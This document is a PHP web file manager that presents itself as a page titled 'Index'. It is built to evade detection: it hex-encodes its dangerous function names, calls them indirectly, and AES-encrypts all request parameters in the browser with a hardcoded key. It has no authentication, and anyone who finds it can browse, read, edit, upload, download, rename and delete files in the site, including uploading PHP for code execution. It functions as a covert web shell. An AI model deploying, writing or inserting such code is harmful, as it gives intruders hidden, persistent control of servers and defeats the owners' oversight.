<?php
$_X = array(
    pack('H*', '6d6b646972'),
    pack('H*', '756e6c696e6b'),
    pack('H*', '72656e616d65'),
    pack('H*', '6d6f76655f75706c6f616465645f66696c65'),
    pack('H*', '69735f646972'),
    pack('H*', '69735f66696c65'),
    pack('H*', '69735f7772697461626c65'),
    pack('H*', '66696c655f657869737473'),
    pack('H*', '7265616c70617468'),
    pack('H*', '626173656e616d65'),
    pack('H*', '70617468696e666f'),
    pack('H*', '72617775726c656e636f6465'),
    pack('H*', '72617775726c6465636f6465'),
    pack('H*', '7374725f7265706c616365'),
    pack('H*', '686561646572'),
    pack('H*', '726d646972'),
    pack('H*', '66696c657065726d73'),
    pack('H*', '6469736b5f667265655f7370616365'),
    pack('H*', '63616c6c5f757365725f66756e635f6172726179'),
    pack('H*', '66696c6573697a65'),
    pack('H*', '636f756e74'),
    pack('H*', '6f70656e73736c5f64656372797074'),
    pack('H*', '737562737472'),
    pack('H*', '6a736f6e5f6465636f6465'),
    pack('H*', '6261736536345f6465636f6465'),
);

function _f($i)
{
    global $_X;
    $a = func_get_args();
    array_shift($a);
    return call_user_func_array($_X[$i], $a);
}

function _d($i, $a)
{
    global $_X;
    return call_user_func_array($_X[18], array($_X[$i], $a));
}

function _g($k, $d)
{
    return isset($_GET[$k]) ? $_GET[$k] : $d;
}

function _p($k, $d)
{
    return isset($_POST[$k]) ? $_POST[$k] : $d;
}

function _u($k)
{
    return isset($_FILES[$k]) ? $_FILES[$k] : null;
}

final class M
{
    private $root;
    private $cwd;
    private $act;
    private $msg;
    private $msgOk = true;
    private $kDir = 'p';
    private $kAct = 'x';
    private $kFle = 'q';
    private $kTo  = 'r';
    private $kNam = 's';
    private $kUp  = 'u';
    private $kCnt = 'c';
    private $_P = null;

    function __construct()
    {
        $r = _f(8, __DIR__);
        $this->root = strtr($r ? $r : __DIR__, '\\', '/');
        $this->root = rtrim($this->root, '/');
        if (!_f(4, $this->root)) {
            $this->root = strtr(__DIR__, '\\', '/');
        }
        $this->cwd = $this->_path();
        $this->act = $this->_action();
    }

    function __invoke()
    {
        try {
            $this->_route();
        } catch (Exception $e) {
            $this->msg = $e->getMessage();
            $this->msgOk = false;
        }
        if ($this->act !== 'dl') {
            $this->_out();
        }
    }

    private function _key()
    {
        static $k = null;
        if ($k === null) {
            $k = pack('H*', 'a3f7b2c9d1e8f4a6b0c2d5e7f9a1b3c4d6e8f0a2b5c7d9e1f3a4b6c8d0e2f5a7b9');
        }
        return $k;
    }

    private function _dec()
    {
        $this->_P = array();
        $enc = _p('d', '');
        if ($enc === '') {
            return;
        }
        $raw = _f(24, $enc, true);
        if ($raw !== false && strlen($raw) >= 16) {
            $iv = _f(22, $raw, 0, 16);
            $ct = _f(22, $raw, 16);
            $pt = _f(21, $ct, 'AES-256-CBC', $this->_key(), 1, $iv);
            if ($pt !== false) {
                $arr = _f(23, $pt, true);
                if (is_array($arr)) {
                    $this->_P = $arr;
                    return;
                }
            }
        }
        $arr = _f(23, $raw !== false ? $raw : $enc, true);
        if (is_array($arr)) {
            $this->_P = $arr;
        }
    }

    private function _gp($k, $d = '')
    {
        if ($this->_P === null) {
            $this->_dec();
        }
        return isset($this->_P[$k]) ? $this->_P[$k] : $d;
    }

    private function _path()
    {
        $p = $this->_gp($this->kDir, '');
        if ($p === '') {
            return $this->root;
        }
        $p = strtr((string)$p, '\\', '/');
        $p = _f(11, $p);
        $p = _f(12, $p);
        $p = str_replace(array("\0", '%00'), '', $p);
        while (strpos($p, '..') !== false) {
            $p = _f(13, '..', '', $p);
        }
        $t = $this->root . '/' . trim($p, '/');
        $t = _f(8, $t) ? _f(8, $t) : $t;
        if (strpos(strtr($t, '\\', '/'), $this->root) !== 0) {
            $t = $this->root;
        }
        if (!_f(4, $t)) {
            $t = $this->root;
        }
        return strtr($t, '\\', '/');
    }

    private function _action()
    {
        $a = $this->_gp($this->kAct, '');
        $m = array('cat' => 1, 'wrt' => 1, 'up' => 1, 'dl' => 1, 'del' => 1, 'mv' => 1, 'mk' => 1);
        return isset($m[$a]) ? $a : 'ls';
    }

    private function _route()
    {
        if ($this->act === 'cat') {
            $this->_read();
        } elseif ($this->act === 'wrt') {
            $this->_write();
        } elseif ($this->act === 'up') {
            $this->_recv();
        } elseif ($this->act === 'dl') {
            $this->_send();
        } elseif ($this->act === 'del') {
            $this->_drop();
        } elseif ($this->act === 'mv') {
            $this->_move();
        } elseif ($this->act === 'mk') {
            $this->_mcol();
        }
    }

    private function _safe($name)
    {
        $name = _f(9, strtr((string)$name, '\\', '/'));
        $name = str_replace(array("\0", '%00', '/', '\\'), '', $name);
        $path = $this->cwd . '/' . $name;
        $real = _f(8, $path);
        $path = $real ? $real : $path;
        if (strpos(strtr($path, '\\', '/'), $this->root) !== 0) {
            throw new Exception('Blocked');
        }
        return $path;
    }

    private function _list()
    {
        $r = array();
        try {
            $it = new FilesystemIterator(
                $this->cwd,
                FilesystemIterator::SKIP_DOTS |
                FilesystemIterator::UNIX_PATHS |
                FilesystemIterator::KEY_AS_PATHNAME |
                FilesystemIterator::CURRENT_AS_FILEINFO
            );
            foreach ($it as $fi) {
                $n = $fi->getFilename();
                $r[] = array(
                    'n' => $n,
                    'z' => $fi->isDir() ? null : $fi->getSize(),
                    't' => $fi->getMTime(),
                    'p' => substr(sprintf('%o', $fi->getPerms()), -4),
                    'd' => $fi->isDir()
                );
            }
            usort($r, function ($a, $b) {
                if ($a['d'] !== $b['d']) {
                    return $a['d'] ? -1 : 1;
                }
                return strcasecmp($a['n'], $b['n']);
            });
        } catch (Exception $e) {
            $this->msg = $e->getMessage();
            $this->msgOk = false;
        }
        return $r;
    }

    private function _read()
    {
        $q = $this->_gp($this->kFle, '');
        if ($q === '') {
            return;
        }
        $path = $this->_safe($q);
        if (!_f(5, $path)) {
            throw new Exception('Not a entry');
        }
        $fo = new SplFileObject($path, 'r');
        $fo->setFlags(SplFileObject::DROP_NEW_LINE);
        $c = '';
        while (!$fo->eof()) {
            $c .= $fo->fgets();
        }
        $GLOBALS['_V'] = array($q, $c);
        $this->act = 'view';
    }

    private function _write()
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            return;
        }
        $q = $this->_gp($this->kFle, '');
        $c = $this->_gp($this->kCnt, '');
        if ($q === '') {
            throw new Exception('No target');
        }
        $path = $this->_safe($q);
        if (!_f(5, $path)) {
            throw new Exception('Not a entry');
        }
        if (!_f(6, $path)) {
            throw new Exception('Not writable');
        }
        $fo = new SplFileObject($path, 'w');
        $w = $fo->fwrite($c);
        if ($w === false || ($w === 0 && $c !== '')) {
            throw new Exception('Write failed');
        }
        $this->msg = 'Saved';
        $this->msgOk = true;
    }

    private function _recv()
    {
        if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
            return;
        }
        $f = _u($this->kUp);
        if (!$f || !isset($f['error']) || $f['error'] != 0) {
            throw new Exception('Failed');
        }
        $n = _f(9, isset($f['name']) ? $f['name'] : 'x');
        $n = str_replace(array("\0", '/', '\\'), '', $n);
        $d = $this->cwd . '/' . $n;
        if (_f(7, $d)) {
            throw new Exception('Exists');
        }
        $ok = _f(3, $f['tmp_name'], $d);
        if (!$ok) {
            throw new Exception('Move failed');
        }
        $this->msg = 'Received';
        $this->msgOk = true;
    }

    private function _send()
    {
        $q = $this->_gp($this->kFle, '');
        if ($q === '') {
            return;
        }
        $path = $this->_safe($q);
        if (!_f(5, $path)) {
            throw new Exception('Not found');
        }
        $n = _f(9, $path);
        _f(14, 'Content-Description: transfer');
        _f(14, 'Content-Type: application/octet-stream');
        _f(14, 'Content-Disposition: attachment; name="' . $n . '"');
        _f(14, 'Content-Length: ' . _f(19, $path));
        _f(14, 'Cache-Control: no-store');
        $src = new SplFileObject($path, 'r');
        while (!$src->eof()) {
            echo $src->fread(8192);
        }
        exit;
    }

    private function _drop()
    {
        $q = $this->_gp($this->kFle, '');
        if ($q === '') {
            throw new Exception('No target');
        }
        $path = $this->_safe($q);
        if ($path === $this->root || $path === $this->root . '/') {
            throw new Exception('Cannot drop root');
        }
        if (_f(4, $path)) {
            $ok = $this->_dropDir($path);
        } else {
            $ok = _f(1, $path);
        }
        if (!$ok) {
            throw new Exception('Drop failed');
        }
        $this->msg = 'Dropped';
        $this->msgOk = true;
    }

    private function _dropDir($path)
    {
        if (!_f(4, $path)) {
            return false;
        }
        $it = new FilesystemIterator($path, FilesystemIterator::SKIP_DOTS);
        foreach ($it as $_) {
            return false;
        }
        return _d(15, array($path));
    }

    private function _move()
    {
        $q = $this->_gp($this->kFle, '');
        $r = $this->_gp($this->kTo, '');
        if ($q === '' || $r === '') {
            throw new Exception('Need both');
        }
        $src = $this->_safe($q);
        $dest = $this->_safe($r);
        if ($src === $this->root) {
            throw new Exception('Cannot move root');
        }
        $ok = _f(2, $src, $dest);
        if (!$ok) {
            throw new Exception('Move failed');
        }
        $this->msg = 'Moved';
        $this->msgOk = true;
    }

    private function _mcol()
    {
        $s = $this->_gp($this->kNam, '');
        if ($s === '') {
            throw new Exception('Need name');
        }
        $s = _f(9, $s);
        $s = str_replace(array("\0", '/', '\\'), '', $s);
        $p = $this->cwd . '/' . $s;
        if (_f(7, $p)) {
            throw new Exception('Exists');
        }
        $ok = _d(0, array($p, 0755, true));
        if (!$ok) {
            throw new Exception('Mkcol failed');
        }
        $this->msg = 'Created';
        $this->msgOk = true;
    }

    private function _crumb()
    {
        $rel = substr($this->cwd, strlen($this->root));
        $rel = trim(strtr($rel, '\\', '/'), '/');
        $s = $rel === '' ? array() : explode('/', $rel);
        $c = array(array('l' => '/', 'p' => ''));
        $a = '';
        foreach ($s as $v) {
            $a .= '/' . $v;
            $c[] = array('l' => $v, 'p' => ltrim($a, '/'));
        }
        return $c;
    }

    private function _sz($b)
    {
        if ($b === null) {
            return '--';
        }
        $u = array('B', 'K', 'M', 'G');
        $i = 0;
        while ($b >= 1024 && $i < 3) {
            $b /= 1024;
            $i++;
        }
        return round($b, 1) . $u[$i];
    }

    private function _pm($o)
    {
        $m = array('---', '--x', '-w-', '-wx', 'r--', 'r-x', 'rw-', 'rwx');
        if (strlen($o) === 3) {
            $o = '0' . $o;
        }
        return (isset($m[(int)$o[0]]) ? $m[(int)$o[0]] : '---') .
               (isset($m[(int)$o[1]]) ? $m[(int)$o[1]] : '---') .
               (isset($m[(int)$o[2]]) ? $m[(int)$o[2]] : '---') .
               (isset($m[(int)$o[3]]) ? $m[(int)$o[3]] : '---');
    }

    private function _ic($x, $d)
    {
        if ($d) {
            return 'D';
        }
        $e = _f(10, $x);
        $e = isset($e['extension']) ? strtolower($e['extension']) : '';
        $map = array(
            'php' => 'P', 'js' => 'J', 'css' => 'C', 'html' => 'H', 'txt' => 'T',
            'png' => 'I', 'jpg' => 'I', 'gif' => 'I', 'svg' => 'I',
            'zip' => 'Z', 'gz' => 'Z', 'tar' => 'Z', 'sql' => 'Q', 'pdf' => 'F'
        );
        return isset($map[$e]) ? $map[$e] : '·';
    }

    private function _je($v)
    {
        return htmlspecialchars(json_encode($v, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE), ENT_QUOTES, 'UTF-8');
    }

    private function _out()
    {
        $list = $this->_list();
        $crumb = $this->_crumb();
        $v = isset($GLOBALS['_V']) ? $GLOBALS['_V'] : null;
        unset($GLOBALS['_V']);
        $rel = substr($this->cwd, strlen($this->root));
        $last = count($crumb) - 1;
        $lastPath = isset($crumb[$last]['p']) ? $crumb[$last]['p'] : null;
        ?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Index</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d1117;color:#c9d1d9;font:14px/1.5 sans-serif}
a{color:#58a6ff;text-decoration:none;cursor:pointer}a:hover{text-decoration:underline}
.hd{background:#161b22;border-bottom:1px solid #30363d;padding:10px 16px;display:flex;justify-content:space-between;align-items:center}
.hd h1{font-size:16px}.hd span{color:#58a6ff}
.br{padding:6px 16px;border-bottom:1px solid #30363d;font-size:12px;display:flex;gap:4px;flex-wrap:wrap}
.br a{color:#8b949e}.br .cr{color:#c9d1d9;font-weight:600}
.br .s{color:#8b949e}
.ct{max-width:1300px;margin:0 auto;padding:12px 16px}
.msg{padding:8px 12px;border-radius:4px;margin-bottom:10px;font-size:12px}
.ok{background:#1a3a1a;color:#3fb950;border:1px solid #3fb950}
.er{background:#3a1a1a;color:#f85149;border:1px solid #f85149}
.tb{display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:12px}
.tb form{display:flex;gap:4px;align-items:center}
.tb input[type=text]{background:#161b22;border:1px solid #30363d;color:#c9d1d9;padding:5px 10px;border-radius:4px;font:12px sans-serif;min-width:120px}
.tb input[type=text]:focus{outline:none;border-color:#58a6ff}
.tb input[type=file]{font-size:12px;color:#8b949e}
.b{display:inline-flex;align-items:center;gap:2px;padding:5px 10px;border-radius:4px;border:1px solid #30363d;font:12px sans-serif;cursor:pointer;background:#21262d;color:#c9d1d9;transition:background .15s;white-space:nowrap}
.b:hover{background:#30363d}
.ba{background:#1f3a5f;border-color:#58a6ff;color:#58a6ff}.ba:hover{background:#2a4a7f}
.bd{background:#3a1818;border-color:#f85149;color:#f85149}.bd:hover{background:#4a2020}
.bs{padding:3px 8px;font-size:11px}
table{width:100%;border-collapse:collapse;background:#161b22;border-radius:4px;overflow:hidden;border:1px solid #30363d}
th,td{padding:8px 10px;text-align:left;border-bottom:1px solid #30363d;white-space:nowrap}
th{font-size:11px;color:#8b949e;background:#21262d;text-transform:uppercase}
tr:hover td{background:rgba(88,166,255,.04)}
td.nn{max-width:400px;overflow:hidden;text-overflow:ellipsis}
td.nn a{font:13px monospace}
td.sz{font:12px monospace;color:#8b949e;text-align:right}
td.tm{font-size:11px;color:#8b949e}
td.pm{font:10px monospace;color:#8b949e}
td.ac{text-align:right}
.ed{background:#161b22;border:1px solid #30363d;border-radius:4px;margin-bottom:12px}
.eh{display:flex;justify-content:space-between;align-items:center;padding:8px 12px;border-bottom:1px solid #30363d;background:#21262d}
.eh h3{font:13px monospace}.eh span{color:#58a6ff}
.eb textarea{width:100%;min-height:400px;background:#0d1117;color:#e6edf3;border:none;padding:12px;font:13px/1.6 monospace;tab-size:4;resize:vertical;outline:none}
.ef{display:flex;justify-content:flex-end;gap:6px;padding:8px 12px;border-top:1px solid #30363d;background:#21262d}
.emp{text-align:center;padding:30px;color:#8b949e;font-size:13px}
.ft{text-align:center;padding:14px;color:#8b949e;font-size:11px;border-top:1px solid #30363d;margin-top:16px}
@media(max-width:768px){td.pm,th.pm{display:none}.tb{flex-direction:column;align-items:stretch}}
</style>
</head>
<body>
<div class="hd"><h1>· <span>Index</span></h1><div style="font-size:11px;color:#8b949e">PHP <?php echo PHP_VERSION;?></div></div>
<div class="br">
<?php foreach ($crumb as $i => $c): ?>
<?php if ($i > 0): ?><span class="s">/</span><?php endif; ?>
<?php if ($c['p'] === $lastPath): ?>
<span class="cr"><?php echo htmlspecialchars($c['l']);?></span>
<?php else: ?>
<a href="#" onclick="G({<?php echo $this->kDir;?>:<?php echo $this->_je($c['p']);?>});return false"><?php echo htmlspecialchars($c['l']);?></a>
<?php endif; ?>
<?php endforeach; ?>
</div>
<div class="ct">
<?php if ($this->msg !== null): ?>
<div class="msg <?php echo $this->msgOk ? 'ok' : 'er'; ?>"><?php echo htmlspecialchars($this->msg);?></div>
<?php endif; ?>
<?php if ($v !== null): ?>
<div class="ed">
<div class="eh">
<h3>· <span><?php echo htmlspecialchars($v[0]);?></span></h3>
<div style="display:flex;gap:6px">
<a href="#" onclick="G({<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false" class="b bs">Back</a>
<a href="#" onclick="G({<?php echo $this->kAct;?>:<?php echo $this->_je('dl');?>,<?php echo $this->kFle;?>:<?php echo $this->_je($v[0]);?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false" class="b bs ba">Get</a>
</div>
</div>
<form method="post" onsubmit="FS(this,{<?php echo $this->kAct;?>:<?php echo $this->_je('wrt');?>,<?php echo $this->kFle;?>:<?php echo $this->_je($v[0]);?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false">
<div class="eb"><textarea name="<?php echo $this->kCnt;?>" spellcheck="false"><?php echo htmlspecialchars($v[1]);?></textarea></div>
<div class="ef">
<a href="#" onclick="G({<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false" class="b">Cancel</a>
<button class="b ba">Save</button>
</div>
</form>
</div>
<?php else: ?>
<div class="tb">
<form method="post" onsubmit="FS(this,{<?php echo $this->kAct;?>:<?php echo $this->_je('mk');?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false"><input type="text" name="<?php echo $this->kNam;?>" placeholder="+ dir" required><button class="b">+</button></form>
<form method="post" enctype="multipart/form-data" onsubmit="FU(this,{<?php echo $this->kAct;?>:<?php echo $this->_je('up');?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false"><input type="hidden" name="d"><input type="file" name="<?php echo $this->kUp;?>" required><button class="b ba">Send</button></form>
<form method="post" onsubmit="FS(this,{<?php echo $this->kAct;?>:<?php echo $this->_je('mv');?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false"><input type="text" name="<?php echo $this->kFle;?>" placeholder="from" style="width:90px" required><span style="color:#8b949e">→</span><input type="text" name="<?php echo $this->kTo;?>" placeholder="to" style="width:90px" required><button class="b">Ed</button></form>
</div>
<?php if (_f(20, $list) === 0): ?>
<div class="emp">empty</div>
<?php else: ?>
<table><thead><tr><th></th><th class="nn">Name</th><th class="sz">Size</th><th class="tm">Modified</th><th class="pm">Perms</th><th class="ac">Act</th></tr></thead><tbody>
<?php foreach ($list as $e): ?>
<tr>
<td style="text-align:center;font-size:14px"><?php echo $this->_ic($e['d'] ? '' : $e['n'], $e['d']);?></td>
<td class="nn">
<?php if ($e['d']): ?>
<?php $lk = ltrim(strtr($rel . '/' . $e['n'], '\\', '/'), '/'); ?>
<a href="#" onclick="G({<?php echo $this->kDir;?>:<?php echo $this->_je($lk);?>});return false"><?php echo htmlspecialchars($e['n']);?>/</a>
<?php else: ?>
<a href="#" onclick="G({<?php echo $this->kAct;?>:<?php echo $this->_je('cat');?>,<?php echo $this->kFle;?>:<?php echo $this->_je($e['n']);?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false"><?php echo htmlspecialchars($e['n']);?></a>
<?php endif; ?>
</td>
<td class="sz"><?php echo $this->_sz($e['z']);?></td>
<td class="tm"><?php echo date('Y-m-d H:i', $e['t']);?></td>
<td class="pm"><?php echo $this->_pm($e['p']);?></td>
<td class="ac">
<?php if (!$e['d']): ?>
<a href="#" class="b bs" onclick="G({<?php echo $this->kAct;?>:<?php echo $this->_je('dl');?>,<?php echo $this->kFle;?>:<?php echo $this->_je($e['n']);?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>});return false" title="Get">↓</a>
<?php endif; ?>
<a href="#" class="b bs bd" onclick="return confirm('OK?')&&(G({<?php echo $this->kAct;?>:<?php echo $this->_je('del');?>,<?php echo $this->kFle;?>:<?php echo $this->_je($e['n']);?>,<?php echo $this->kDir;?>:<?php echo $this->_je($rel);?>}),false)" title="Drop">×</a>
</td>
</tr>
<?php endforeach; ?>
</tbody></table>
<?php endif; ?>
<?php endif; ?>
</div>
<div class="ft"><?php echo _f(20, $list);?> entries · <?php echo $this->_sz(_f(17, $this->cwd));?> free</div>
<script>
(function(){
var K='a3f7b2c9d1e8f4a6b0c2d5e7f9a1b3c4d6e8f0a2b5c7d9e1f3a4b6c8d0e2f5a7b9';
function H(h){for(var b=new Uint8Array(h.length/2),i=0;i<h.length;i+=2)b[i/2]=parseInt(h.substr(i,2),16);return b;}
  function B(b){for(var s='',i=0,c=8192;i<b.length;i+=c)s+=String.fromCharCode.apply(null,b.subarray(i,i+c));return btoa(s);}
  function T(s){return new TextEncoder().encode(s);}
  async function E(o){
    var s=JSON.stringify(o);
    var c=window.crypto&&crypto.subtle&&crypto.subtle.importKey?crypto.subtle:(window.crypto&&crypto.webkitSubtle&&crypto.webkitSubtle.importKey?crypto.webkitSubtle:null);
    if(!c){return B(T(s));}
    var k=await c.importKey('raw',H(K),{name:'AES-CBC'},false,['encrypt']);
    var iv=crypto.getRandomValues(new Uint8Array(16));
    var d=T(s);
    var ct=await c.encrypt({name:'AES-CBC',iv:iv},k,d);
    var r=new Uint8Array(16+ct.byteLength);
    r.set(iv);r.set(new Uint8Array(ct),16);
    return B(r);
  }
window.G=async function(o){
  var d=await E(o),f=document.createElement('form');
  f.method='POST';f.style.display='none';
  f.innerHTML='<input name=d>';
  f.d.value=d;document.body.appendChild(f);f.submit();
};
window.FS=async function(f,o){
  o=o||{};
  for(var i=0,els=f.querySelectorAll('input[name],textarea[name],select[name]');i<els.length;i++){
    var el=els[i];
    if(el.type!=='file'&&el.name)o[el.name]=el.value;
  }
  await G(o);return false;
};
window.FU=async function(f,o){
  var d=await E(o||{}),i=f.querySelector('input[name=d]');
  if(!i){i=document.createElement('input');i.type='hidden';i.name='d';f.appendChild(i);}
  i.value=d;f.submit();return false;
};
})();
</script>
</body>
</html>
<?php
    }
}

$m = new M();
$m();
